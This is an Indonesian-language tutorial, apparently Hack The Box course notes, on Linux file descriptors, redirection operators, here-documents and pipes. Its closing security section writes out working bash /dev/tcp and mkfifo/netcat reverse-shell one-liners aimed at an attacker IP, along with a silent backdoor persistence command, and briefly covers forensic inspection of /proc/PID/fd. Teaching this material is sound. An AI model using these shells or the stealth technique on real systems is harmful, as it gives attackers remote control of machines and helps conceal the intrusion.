## 1. File Descriptor (FD)

File Descriptor (FD) adalah referensi yang dikelola oleh kernel Linux untuk mengidentifikasi dan mengelola operasi Input/Output (I/O). Setiap file, socket, atau resource I/O yang sedang terbuka akan mendapat nomor unik (FD).

Bayangkan FD seperti nomor tiket penitipan jas:
- Tiketnya adalah File Descriptor
- Jasnya adalah file atau resource
- Petugasnya adalah operating system

Tanpa nomor tiket, OS tidak tahu resource mana yang harus diakses. Di Windows, konsep ini disebut file handle.

### Default File Descriptor di Linux

| FD | Nama | Stream | Keterangan |
|----|------|--------|-------------|
| `0` | STDIN | Input | Standard Input, input dari keyboard / file |
| `1` | STDOUT | Output | Standard Output, output normal program |
| `2` | STDERR | Output | Standard Error, khusus pesan error |

```
┌─────────────────────────────────────────┐
│              Linux Process              │
│                                         │
│  [FD 0 - STDIN]  ──►  Program Input    │
│  [FD 1 - STDOUT] ◄──  Normal Output    │
│  [FD 2 - STDERR] ◄──  Error Output     │
└─────────────────────────────────────────┘
```

## 2. STDIN & STDOUT

Saat menjalankan `cat`, kita memberikan input standar (STDIN, FD 0) ke program. Setelah menekan `[ENTER]`, teks tersebut dikembalikan ke terminal sebagai output standar (STDOUT, FD 1).

```bash
$ cat
SOME INPUT        # ← STDIN (FD 0) — what you type
SOME INPUT        # ← STDOUT (FD 1) — echoed back
```

---

## 3. STDOUT & STDERR

Perintah `find` menghasilkan dua jenis output sekaligus:
- STDOUT (FD 1), hasil yang berhasil ditemukan (hijau)
- STDERR (FD 2), pesan error "Permission denied" (merah)

Untuk menyembunyikan error, kita redirect STDERR ke `/dev/null`, perangkat "lubang hitam" yang membuang semua data yang dikirim ke sana.

```bash
# Show both STDOUT and STDERR
$ find /etc/ -name shadow
/etc/shadow
find: '/etc/ssl/private': Permission denied

# Redirect STDERR to /dev/null (suppress errors)
$ find /etc/ -name shadow 2>/dev/null
/etc/shadow
```

> `2>` berarti "redirect FD 2 (STDERR) ke tujuan yang ditentukan".

## 4. Redirect STDOUT ke File

Kita bisa menyimpan STDOUT ke dalam file menggunakan tanda `>`. Jika file belum ada, file akan dibuat otomatis. Jika sudah ada, file akan ditimpa tanpa konfirmasi.

```bash
$ find /etc/ -name shadow 2>/dev/null > results.txt
$ cat results.txt
/etc/shadow
```

```
find command
    │
    ├──── STDERR (FD 2) ──► /dev/null  (discarded)
    │
    └──── STDOUT (FD 1) ──► results.txt  (saved)
```

---

## 5. Redirect STDOUT dan STDERR ke File Terpisah

Kita bisa memisahkan STDOUT dan STDERR ke dua file berbeda secara bersamaan. Ini sangat berguna saat debugging, karena kita bisa menganalisis error secara terpisah dari output normal.

```bash
$ find /etc/ -name shadow 2> stderr.txt 1> stdout.txt

$ cat stdout.txt
/etc/shadow

$ cat stderr.txt
find: '/etc/ssl/private': Permission denied
find: '/etc/polkit-1/rules.d': Permission denied
```

```
find command
    │
    ├──── STDERR (FD 2) ──► stderr.txt
    │
    └──── STDOUT (FD 1) ──► stdout.txt
```

## 6. Redirect STDIN

Tanda `<` digunakan untuk memberikan isi file sebagai STDIN ke sebuah perintah. Arahnya berlawanan dengan `>`: data mengalir dari file ke program.

Bayangkan `>` dan `<` sebagai panah arah yang menunjukkan ke mana data mengalir.

```bash
$ cat < stdout.txt
/etc/shadow
```

```
stdout.txt ──► (FD 0 - STDIN) ──► cat ──► terminal output
```

---

## 7. Redirect STDOUT dan Append ke File (`>>`)

Tanda `>>` (double greater-than) digunakan untuk menambahkan output ke akhir file yang sudah ada, tanpa menimpa isinya. Berbeda dengan `>` yang akan menghapus isi file lama.

| Operator | Aksi |
|----------|------|
| `>` | Timpa file (overwrite) |
| `>>` | Tambahkan ke akhir (append) |

```bash
$ find /etc/ -name passwd >> stdout.txt 2>/dev/null
$ cat stdout.txt
/etc/shadow          # ← existing content
/etc/pam.d/passwd    # ← appended
/etc/cron.daily/passwd
/etc/passwd
```

---

## 8. Redirect Stream STDIN ke File (`<<` / Here-Document)

`<<` (double lower-than) digunakan untuk streaming input langsung dari terminal ke file. Ini disebut here-document. Kita mendefinisikan penanda akhir input (biasanya `EOF`, End Of File). Semua teks yang diketik sebelum `EOF` dianggap sebagai input.

```bash
$ cat << EOF > stream.txt
> Hack The Box
> EOF

$ cat stream.txt
Hack The Box
```

> `EOF` hanyalah konvensi, kita bisa memakai kata apa pun sebagai penanda akhir (misalnya `END`, `STOP`, `DONE`).

## 9. Pipe (`|`)

Pipe (`|`) digunakan untuk menghubungkan output satu perintah sebagai input ke perintah berikutnya. Ini memungkinkan kita membangun rantai perintah yang powerful tanpa perlu menyimpan data ke file sementara.

Pipe bisa dirantai berkali-kali. Output dari perintah pertama menjadi input perintah kedua, lalu outputnya menjadi input perintah ketiga, dan seterusnya.

```bash
# Single pipe: find .conf files and filter for "systemd"
$ find /etc/ -name *.conf 2>/dev/null | grep systemd
/etc/systemd/system.conf
/etc/systemd/timesyncd.conf
/etc/systemd/journald.conf
/etc/systemd/user.conf
/etc/systemd/logind.conf
/etc/systemd/resolved.conf

# Chained pipes: add wc to count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

Alur pipeline:
```
[find /etc/ -name *.conf]
          │  STDOUT
          ▼
    [grep systemd]          ← filters only "systemd" lines
          │  STDOUT
          ▼
        [wc -l]             ← counts the remaining lines
          │
          ▼
          6
```

## Operator Redireksi: Referensi Cepat

| Operator | Nama | Keterangan |
|----------|------|-------------|
| `>` | Redirect STDOUT | Tulis output ke file (overwrite) |
| `>>` | Append STDOUT | Tambahkan output ke file |
| `<` | Redirect STDIN | Baca input dari file |
| `<<` | Here-Document | Stream input multi-baris |
| `2>` | Redirect STDERR | Tulis error ke file |
| `2>/dev/null` | Suppress STDERR | Buang semua pesan error |
| `1>` | Explicit STDOUT | Tulis STDOUT ke file (sama dengan `>`) |
| `2>&1` | Gabungkan STDERR→STDOUT | Satukan stream error ke stream output |
| `\|` | Pipe | Alirkan STDOUT ke STDIN perintah berikutnya |

---

## Contoh Pipeline Lengkap

```bash
# Find all .conf files, filter for "systemd", count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

```
find /etc/ -name *.conf
    │
    ├── STDERR ──► /dev/null      (errors suppressed)
    │
    └── STDOUT ──► grep systemd   (filter results)
                        │
                        └── STDOUT ──► wc -l   (count lines)
                                          │
                                          └──► 6
```

## Ringkasan Alur File Descriptor

```
                  ┌──────────────────┐
  Keyboard ──────►│  FD 0 (STDIN)    │
                  │                  │
                  │     PROCESS      │
                  │                  │
  Terminal ◄──────│  FD 1 (STDOUT)   │
                  │                  │
  Terminal ◄──────│  FD 2 (STDERR)   │
                  └──────────────────┘

Redirection changes where these streams go:
  STDIN  (0) : keyboard → file (<) or here-doc (<<)
  STDOUT (1) : terminal → file (>) or append (>>)
  STDERR (2) : terminal → file (2>) or /dev/null (suppress)
```

## 10. Catatan Keamanan: Reverse Shell, Pembajakan File Descriptor & Evasion

Pemahaman mendalam tentang file descriptor (FD) dan redireksi I/O adalah inti dari mekanisme reverse shell dan teknik stealth di Linux.

1. Anatomi bash reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`):
   - `bash -i`: menjalankan instance shell interaktif.
   - `>& /dev/tcp/IP/PORT`: meretransmisikan STDOUT (FD 1) dan STDERR (FD 2) ke socket jaringan TCP target.
   - `0>&1`: menduplikasikan STDIN (FD 0) dari STDOUT (FD 1), sehingga perintah yang dikirim attacker melalui socket dibaca sebagai input shell.
2. Named pipe / FIFO reverse shell (`mkfifo`): menggunakan pipe berkas khusus (`mkfifo /tmp/f`) untuk membuat saluran komunikasi dua arah ketika pseudo-device `/dev/tcp` dinonaktifkan pada kompilasi Bash tertentu.
3. Evasion & output suppression (`>/dev/null 2>&1`): mengarahkan STDOUT dan STDERR secara bersamaan ke `/dev/null` untuk menjalankan payload atau script scanning secara senyap tanpa menghasilkan artefak di terminal korban.
4. Forensik proses lewat `/proc/<PID>/fd/`: auditor keamanan bisa memeriksa folder `/proc/<PID>/fd/` untuk melihat semua koneksi socket, file terbuka, dan pipa komunikasi aktif milik proses yang mencurigakan.

```bash
# ── REVERSE SHELL ONE-LINERS (FD EXPLOITATION) ───────────────

# 1. Native Bash /dev/tcp reverse shell
$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# 2. Named pipe (FIFO) reverse shell
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# 3. Silent background persistence script
$ nohup ./backdoor.sh >/dev/null 2>&1 &

# ── FORENSIC FD AUDITING ─────────────────────────────────────
# List all active descriptors of process PID 1337
$ ls -la /proc/1337/fd/
# lrwx------ 1 root root 64 0 -> /dev/pts/0
# lrwx------ 1 root root 64 1 -> socket:[28491]
# lrwx------ 1 root root 64 2 -> socket:[28491]
# lrwx------ 1 root root 64 3 -> /etc/shadow
```

## Cheatsheet Referensi Cepat

```bash
# Suppress errors
command 2>/dev/null

# Save output to file (overwrite)
command > output.txt

# Save output to file (append)
command >> output.txt

# Save STDOUT and STDERR separately
command 1> stdout.txt 2> stderr.txt

# Merge STDERR into STDOUT
command > output.txt 2>&1

# Read file as STDIN
command < input.txt

# Here-document (multi-line stdin)
command << EOF
line one
line two
EOF

# Pipe output to next command
command1 | command2 | command3

# Practical pipeline
find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
```
